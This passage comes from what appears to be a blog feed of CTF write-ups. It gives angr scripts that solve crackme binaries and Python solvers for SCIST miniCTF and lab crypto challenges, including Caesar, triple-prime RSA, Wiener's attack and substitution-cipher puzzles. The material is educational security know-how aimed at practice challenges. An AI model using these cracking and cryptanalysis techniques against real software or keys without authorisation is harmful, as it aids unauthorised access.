hook.c</code></p><p><img src="https://i.imgur.com/IOXKvFB.png"></p><p><code>LD_PRELOAD=./hook.so strace ./ptrace_me</code></p><h3 id="darkCON-Too-Much"><a href="#darkCON-Too-Much" class="headerlink" title="darkCON_Too_Much"></a>darkCON_Too_Much</h3><p><img src="https://i.imgur.com/mxJYtUS.png?80"></p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> claripy <span class="token keyword">import</span> <span class="token operator">*</span>bin <span class="token operator">=</span> <span class="token string">'./rev'</span>p <span class="token operator">=</span> Project<span class="token punctuation">(</span>bin<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>BVS<span class="token punctuation">(</span>f<span class="token string">'flag_{i}'</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span>stdin<span class="token operator">=</span>flag<span class="token punctuation">)</span>sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>st<span class="token punctuation">)</span>sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> b<span class="token string">'Congrats'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                avoid<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> b<span class="token string">'Please'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> s <span class="token keyword">in</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://i.imgur.com/LNC3EJJ.png"></p><blockquote><p>flag </p></blockquote><pre class=" language-bash"><code class="language-bash">darkCON<span class="token punctuation">{</span>4r3_y0u_r34lly_th1nk1n9_th4t_y0u_c4n_try_th15_m4nu4lly???_Ok_I_th1nk_y0u_b3tt3r_us3_s0m3_aut0m4t3d_t00ls_l1k3_4n9r_0r_Z3_t0_m4k3_y0ur_l1f3_much_e4s13r.C0ngr4ts_f0r_s0lv1in9_th3_e4sy_ch4ll3ng3<span class="token punctuation">}</span></code></pre><h3 id="AIS3-crackme-Angr"><a href="#AIS3-crackme-Angr" class="headerlink" title="AIS3_crackme(Angr)"></a>AIS3_crackme(Angr)</h3><p>先看一下這支檔案在做甚麼<br>是簡單的 if-else 判斷<br><img src="https://i.imgur.com/8dKV5bS.png?80"><br>我們去看一下<code>verify</code>這個 function 在判斷甚麼<br><img src="https://i.imgur.com/GN5kOc9.png"><br>上面那些條件式全部都正確的話會<code>return i==23</code><br>可以猜到長度應該是 23</p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> angr <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> claripy <span class="token keyword">import</span> <span class="token operator">*</span>bin <span class="token operator">=</span> <span class="token string">'./ais3_crackme'</span>p <span class="token operator">=</span> Project<span class="token punctuation">(</span>bin<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>BVS<span class="token punctuation">(</span>f<span class="token string">'flag_{i}'</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>st <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span>args<span class="token operator">=</span><span class="token punctuation">[</span>bin<span class="token punctuation">,</span>flag<span class="token punctuation">]</span><span class="token punctuation">)</span>sm <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>st<span class="token punctuation">)</span>sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> b<span class="token string">'Correct'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        avoid<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> b<span class="token string">'sorry'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> s <span class="token keyword">in</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>cast_to<span class="token operator">=</span>bytes<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag <code>ais3{I_tak3_g00d_n0t3s}</code></p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SCIST </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 SCIST miniCTF write-up</title>
      <link href="/2021/01/24/2021-SCIST-miniCTF-write-up/"/>
      <url>/2021/01/24/2021-SCIST-miniCTF-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><p>第一屆 SCIST 資安課程 練習賽</p><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/01/24 9:30-13:00</td></tr><tr><td>Rank(team)</td><td>2</td></tr><tr><td>Score</td><td>940</td></tr></tbody></table><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h3><p>題目:</p><pre class=" language-python"><code class="language-python">Tj5ETk92VVVVWj4vYG5cbVpgXG50WmdqZzg4eAU<span class="token operator">=</span></code></pre><p>看到字串後面有<code>=</code>就可以猜到題目先做了base64的加密</p><blockquote><p>含有不可視字元，丟上去線上工具會爛掉</p></blockquote><p>所以要用 terminal 裡面的<br>然後自己寫一個 Caesar<br><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode <span class="token keyword">as</span> b64da<span class="token operator">=</span><span class="token string">'Tj5ETk92VVVVWj4vYG5cbVpgXG50WmdqZzg4eAU='</span>a<span class="token operator">=</span><span class="token punctuation">(</span>b64d<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'S'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                key<span class="token operator">=</span>i                <span class="token keyword">break</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>key<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><div class="spoiler collapsed">    <div class="spoiler-title">        MuMu 的 One Line Python    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> c <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> i <span class="token punctuation">,</span> key <span class="token punctuation">:</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">)</span> <span class="token punctuation">,</span> c <span class="token punctuation">,</span> <span class="token punctuation">[</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> a <span class="token punctuation">,</span> b <span class="token punctuation">:</span> ord<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">-</span> ord<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token string">"SCIST"</span> <span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">"output.txt"</span> <span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>    </div></div><blockquote><p>flag:<code>SCIST{ZZZ_C4esar_easy_lol==}</code></p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        <bonus> Caesar 變形種 By:MuMu    </bonus></div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python">U0JHUFB2aGhsVldUYmJkXlFbTVBNUF1KWmQ<span class="token operator">=</span></code></pre><p><img src="https://i.imgur.com/I1odGCc.png"></p><p><img src="https://i.imgur.com/fQq124b.png"></p><p>所以 Caesar 那題的更精確 solution:<br><img src="https://i.imgur.com/Y6FebA3.png"></p>    </div></div><h3 id="Triple-Prime"><a href="#Triple-Prime" class="headerlink" title="Triple Prime"></a>Triple Prime</h3><p>孿生質數 Twin Prime 的三胞胎版本(?<br>可以參考<a href="https://www.slideshare.net/ssuseraba268/rsa-in-ctf">Rsa in CTF</a>的第八頁</p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python">c<span class="token operator">=</span> <span class="token number">67492486663486144772221547069643364693153882987514859982801483371495669234313843407759516594581600505367563236786229196073368724923881815927703467529105355771821522774825198758466493383723698769253456158342022557472368699641009606588908947853294254252464792031328215741187269870367497007150999774039497278814</span>e<span class="token operator">=</span> <span class="token number">65537</span>n1<span class="token operator">=</span> <span class="token number">129460532860596440160706624843422070781645956231421467972744690581522205174258577915016187584314083476242785444854594515879017256215500086068771217735325021467405636414989186151325017345519162566774426861247861213205744866676097362990428554608031872143809925068116556339068532303253893915296775431906994181539</span>n2<span class="token operator">=</span> <span class="token number">129460532860596440160706624843422070781645956231421467972744690581522205174258577915016187584314083476242785444854594515879017256215500086068771217735325067405197029444112630416870299593351527503478052614265205752423349122130014615189517699859405374248112610462948216897942561697411354097800772588356777342511</span>n3<span class="token operator">=</span> <span class="token number">129460532860596440160706624843422070781645956231421467972744690581522205174258577915016187584314083476242785444854594515879017256215500086068771217735325159280779815502359518947960864089016257376885304120299894830858557633037849119587695990362152378456717981252611538015690620485726274462808766901256343664479</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>pq<span class="token operator">=</span><span class="token punctuation">(</span>n2<span class="token operator">-</span>n1<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>phi1<span class="token operator">=</span>n1<span class="token operator">-</span>pq<span class="token operator">+</span><span class="token number">1</span>phi2<span class="token operator">=</span>n1<span class="token operator">+</span>pq<span class="token operator">+</span><span class="token number">1</span>phi3<span class="token operator">=</span>n1<span class="token operator">+</span><span class="token number">5</span><span class="token operator">*</span>pq<span class="token operator">+</span><span class="token number">25</span>d1<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>d2<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi2<span class="token punctuation">)</span>d3<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi3<span class="token punctuation">)</span>m<span class="token operator">=</span>pow<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d3<span class="token punctuation">,</span>n3<span class="token punctuation">)</span><span class="token punctuation">,</span>d2<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token punctuation">,</span>d1<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag:<code>SCIST{twin_prime==vykp_rtkog}</code></p></blockquote><h3 id="Winner-Winner-Chicken-Dinner"><a href="#Winner-Winner-Chicken-Dinner" class="headerlink" title="Winner Winner Chicken Dinner"></a>Winner Winner Chicken Dinner</h3><p>低解密指數攻擊 Wiener Attack<br>特性：</p><ol><li>q&lt;p&lt;2q</li><li><img src="https://i.imgur.com/w4QJpLE.png"></li></ol><p>可以參考<a href="https://www.slideshare.net/ssuseraba268/rsa-in-ctf">Rsa in CTF</a>的第21頁</p><p><code>git clone https://github.com/pablocelayes/rsa-wiener-attack</code></p><p>記得要把py檔放在同一目錄下</p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> RSAwienerHacker<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">68126437388977012491646508485989748986441131328587518477687317430610358060299259889270096202942172667026765693121007244799277906816721129879871839668534245685223273320285357819059314305041568152938631311930694380458197864770594205779250872221180313165818499006934672425382344026926216633834392646021142886769</span>e <span class="token operator">=</span> <span class="token number">15950795120525802915045576886792784828953195706868419082039089065630551280007920240748167126298220976040006667069839541710102987502293373955109113066554922904845606595280968695858510227233594594345712943776826231898942926115077969092158946886802684295287362659572633661590452939636520740933192957991470727487</span>c <span class="token operator">=</span> <span class="token number">64084228016799140236089362630474537548271913453940735254127977713219774643382144415063040580056793784702386932065587548669067894646547290107939535980687043376839097247039277684116912998816751608587498829246494557174907620772811870282348713591834440433602622206371153329743437983172303794473772691521200966081</span>d<span class="token operator">=</span>RSAwienerHacker<span class="token punctuation">.</span>hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>m<span class="token operator">=</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>flag:<code>SCIST{w13n3R_aTt4cK_1S_Ez_wh3n_d_with_E}</code></p></blockquote><h3 id="Shuffle-Puzzle"><a href="#Shuffle-Puzzle" class="headerlink" title="Shuffle Puzzle"></a>Shuffle Puzzle</h3><p>此題為 Substitution cipher</p><p>從<code>task.py</code>可以看到<code>freq</code>是把<code>flag</code>去做詞頻分析後 字母高到低遞減輸出</p><p>所以我們把<code>res</code>去<code>decode()</code>拿到密文之後<br>也把密文去做詞頻分析</p><p>再將兩者的頻率對照<br>就可以把密文轉回明文了</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> Counter<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"output.txt"</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>c <span class="token operator">=</span> bytes<span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> c<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#明文的字母頻率高低</span>freq<span class="token operator">=</span><span class="token string">' EATNISORHLDCGWUBFYPKMVXZJQ'</span><span class="token comment" spellcheck="true">#計算密文的字母頻率高低</span>newf <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span><span class="token keyword">lambda</span> i <span class="token punctuation">:</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> sorted<span class="token punctuation">(</span>Counter<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> key <span class="token operator">=</span> <span class="token keyword">lambda</span> i <span class="token punctuation">:</span> i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> reverse <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>newf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#用頻率高低對照替換前的字母和替換後的字母，然後把你的密文替換回明文</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>freq<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>newf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>freq<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>flag </p><pre class=" language-bash"><code class="language-bash">HEREUPON LEGRAND AROSE WITH A GRAVE AND STATELY AIR AND BROUGHT ME THE BEETLEFROM A GLASS CASE IN WHICH IT WAS ENCLOSED IT WAS A BEAUTIFUL SCARABAEUS AND ATTHAT TIME UNKNOWN TO NATURALISTSOF COURSE A GREAT PRIZE IN A SCIENTIFIC POINTOF VIEW THERE WERE TWO ROUND BLACK SPOTS NEAR ONE EXTREMITY OF THE BACK AND ALONG ONE NEAR THE OTHER THE SCALES WERE EXCEEDINGLY HARD AND GLOSSY WITH ALL THEAPPEARANCE OF BURNISHED GOLD THE WEIGHT OF THE INSECT WAS VERY REMARKABLE ANDTAKING ALL THINGS INTO CONSIDERATION I COULD HARDLY BLAME JUPITER FOR HIS OPINIONRESPECTING IT SCIST I KNOW THIS FLAG IS VERY LONG BECAUSE I NEED MAKE FREQUENCY ANALYSIS WORK ON THIS CHALLENGE AND I WANT TO ASK WHETHER DID U SOLVE THIS BY HAND</code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Fuck…"><a href="#Fuck…" class="headerlink" title="Fuck…?"></a>Fuck…?</h3><p>檔案裡面的東東用<!--?php?-->包起來了<br>所以可以試著用php執行</p><p>先裝php <code>sudo apt install php7.2-cli</code></p><p>執行一次 將ERROR丟掉 抓SCIST的關鍵字<br><code>php output.txt 2&gt;&amp;1 | grep "SCIST{.*}</code></p><p>Regex標準式<br><img src="https://i.imgur.com/Z0JqqX0.png"></p><blockquote><p>flag:<code>SCIST{Wtf_1s_th3sE_bu!L_sH1T...PHPFuck= =?}</code></p></blockquote><h3 id="Bits"><a href="#Bits" class="headerlink" title="Bits"></a>Bits</h3><p>既然他只有兩種顏色 1 和 0<br>那整體的形狀還是看的出來吧XD<br>所以可以縮小就得到 flag</p><p><img src="https://i.imgur.com/WF4aEVy.jpg"></p><h3 id="Re-g-eE-x"><a href="#Re-g-eE-x" class="headerlink" title="Re[g][eE]x"></a>Re[g][eE]x</h3><p>此題為 Regex 正規表示式<br>按照格式打出合理的 flag 就可以了<br><code>^SCIST{[KCck]+[0Oo]*[1!Lli]{2,}_[\d\D]+_[\W]{1, 3}_(fL4G|flag)_no(?!ne)_ex(PRES|pres)(S[1L!lil0N])}$</code><br>可以拿到 <a href="https://regex101.com/">regex101</a> 測</p><blockquote><p>flag<br>Ex. <code>SCIST{k11_1_##_fL4G_no_exPRESSioN}</code></p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SCIST </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SCIST Security Note Crypto</title>
      <link href="/2020/12/26/2020-SCIST-Security-Note-Crypto/"/>
      <url>/2020/12/26/2020-SCIST-Security-Note-Crypto/</url>
      
        <content type="html"><![CDATA[<h2 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h2><h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><h3 id="YANG-RSA-1"><a href="#YANG-RSA-1" class="headerlink" title="YANG_RSA-1"></a>YANG_RSA-1</h3><div class="spoiler collapsed">    <div class="spoiler-title">        problem.txt    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">83092583783534841000145280642003842283533340442637642451258941907393275732996256523893438356692786223410880194199043046345864683398238392329295750150314289824255749149834103</span>e <span class="token operator">=</span> <span class="token number">11</span>c <span class="token operator">=</span> <span class="token number">32392151763267291269610586564983347951891395196084251182633225594245167922176424232164117237142038355860036871811244158149537196288428230971760474130300660929743492107190512</span></code></pre>    </div></div><p>It is a basic RSA.<br>Since <code>n</code> is small, we can get its factorization(p,q) by using <a href="http://factordb.com/">factordb</a>.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">83092583783534841000145280642003842283533340442637642451258941907393275732996256523893438356692786223410880194199043046345864683398238392329295750150314289824255749149834103</span>e <span class="token operator">=</span> <span class="token number">11</span>c <span class="token operator">=</span> <span class="token number">32392151763267291269610586564983347951891395196084251182633225594245167922176424232164117237142038355860036871811244158149537196288428230971760474130300660929743492107190512</span>p <span class="token operator">=</span> <span class="token number">2262150367</span>q <span class="token operator">=</span> <span class="token number">3006300461</span>r <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Flag <code>BreakALLCTF{R$A_!s_so_e@sy_r!ght?....}</code></p><h3 id="YANG-RSA-2"><a href="#YANG-RSA-2" class="headerlink" title="YANG_RSA-2"></a>YANG_RSA-2</h3><div class="spoiler collapsed">    <div class="spoiler-title">        problem.txt    </div>    <div class="spoiler-content">        <pre class=" language-py"><code class="language-py">n = 1005098784594165848821832590501628403524802902674053382968470498538675288024873128424879364961488454145355936225677709124632789481770148984368708158164916266844271786072406765898627538801884748356080826075494258116818573097428235536790636847100997446916017821607591551722483794674940379793999230206353715117589898489861301662334780242666620337676110221421426102941068711974618344098371538140671153829377393837740293830337243493085160451872753422509384072905634851957789103689582476286664749588114456827960476870164048784404280351460249562996906271414272625881748849175309114734205368513000888013065441040602267654552015590863773059574256085653649422840863428324602357578340644446996674941825103598620438972286389472676382307637357209115141975325946791432841852827828407465818721747161090664009799105129953728589693126992849713556841586265400095017954688319716059398240941350468461830314384384626840855999556176928576367255322330539451380078690665639135509274932616776447492100759094249811584415361859939091438557866035439570864472528889723274777281738473905899882030941410513275852891694991922437995200537246398155615904052214367857177598437501143127042446835618109714924845047124233631838729882640996639575165133299706184551662489093e = 7c = 44163895521220531459057055795752057167876718238617963549906371036055586914199267109947281359325715489398261335563468559859879340774499726524035061903919328383390193234339356811666801858858748990899697833645511123626735258871404048116302274347058468791179874933001105300534600581977271895856972533976629641765182868484553104584590829347999386472615066779248550781718812068424236647225425670871554757459074630360567280382876137651283102473254886990887517217176132596555364994651622062720390486911698802074418697530462711619997107804919499320409084297665919116751543056038865957808455949742740596859550586982302492545205898434968509344729243293414190715139959127090472661918871372070659935437431160846169010492251366727698703670348564864343164944932175842131148853297549424891479394079434940030257530096990169847176293150870765433888895069248560702669885642923421945661068042034911026426121363007026093515922333722778955975053692081279596854554640425470049534192255739670036469</code></pre>    </div></div><p>since <code>c = m^e % n</code><br>if <code>n</code> is too big and <code>m</code> &amp; <code>e</code> is small<br><code>c</code> may less than n (<code>c = m^e</code>)<br>which mean <code>m = c^(1/e)</code></p><pre class=" language-py"><code class="language-py">from Crypto.Util.number import *import gmpy2n = 1005098784594165848821832590501628403524802902674053382968470498538675288024873128424879364961488454145355936225677709124632789481770148984368708158164916266844271786072406765898627538801884748356080826075494258116818573097428235536790636847100997446916017821607591551722483794674940379793999230206353715117589898489861301662334780242666620337676110221421426102941068711974618344098371538140671153829377393837740293830337243493085160451872753422509384072905634851957789103689582476286664749588114456827960476870164048784404280351460249562996906271414272625881748849175309114734205368513000888013065441040602267654552015590863773059574256085653649422840863428324602357578340644446996674941825103598620438972286389472676382307637357209115141975325946791432841852827828407465818721747161090664009799105129953728589693126992849713556841586265400095017954688319716059398240941350468461830314384384626840855999556176928576367255322330539451380078690665639135509274932616776447492100759094249811584415361859939091438557866035439570864472528889723274777281738473905899882030941410513275852891694991922437995200537246398155615904052214367857177598437501143127042446835618109714924845047124233631838729882640996639575165133299706184551662489093e = 7c = 